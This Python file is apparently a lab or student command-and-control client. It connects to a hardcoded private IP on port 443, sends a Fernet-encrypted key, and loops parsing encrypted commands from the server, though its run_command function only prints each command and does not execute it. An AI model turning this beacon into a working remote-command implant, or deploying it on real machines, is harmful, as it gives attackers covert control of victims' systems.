# This is a Client side program that constantly sends a ping to server to ask if the server
# has any commands to run on the client. It keeps listening for response from server
# and whenever it receives commands from server, it runs on the machine.

# Using scapy to create a packet
from scapy.all import *
load_layer("tls")
import sys
from cryptography.fernet import Fernet
from time import sleep
from base64 import b64encode, b64decode

def send_to_server(clientkey):
    pkt = IP()/TCP()
    pkt[IP].dst = "192.168.1.152" #"server Ip address"
    pkt[TCP].dport = 7000 #"server port"
    return pkt/clientkey

def encrypt_payload(payload,key):
    encoded_payload = payload.encode()
    f = Fernet(key)
    return f.encrypt(encoded_payload)

def decrypt_payload(payload,key):
    f = Fernet(key)
    return f.decrypt(payload).decode()

def run_command(command):
    print("Command ({0}) is run successfully!!".format(command))
    return

HOST = "192.168.1.152"
PORT = 443
if __name__ == "__main__":
    clientkey = "0xaaaa"
    fernetkey = "PiffAUwQh2Rt0g4Bo_-yOiKNeHPrub3ljgER0CPqSwQ="
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con = s.connect((HOST,PORT))
    s.send(encrypt_payload(clientkey,fernetkey))
    while True:
        received_msg = s.recv(65535)
        if len(received_msg) != 0:
            msg = decrypt_payload(received_msg,fernetkey)
            if(msg[:6] == clientkey):
                print("======= Receiveed Messages =======\n{0}\n============== Done ==============".format(msg))
                commands_list = msg[6:].split('\n')
                commands_list.pop()
                for command in commands_list:
                    run_command(command)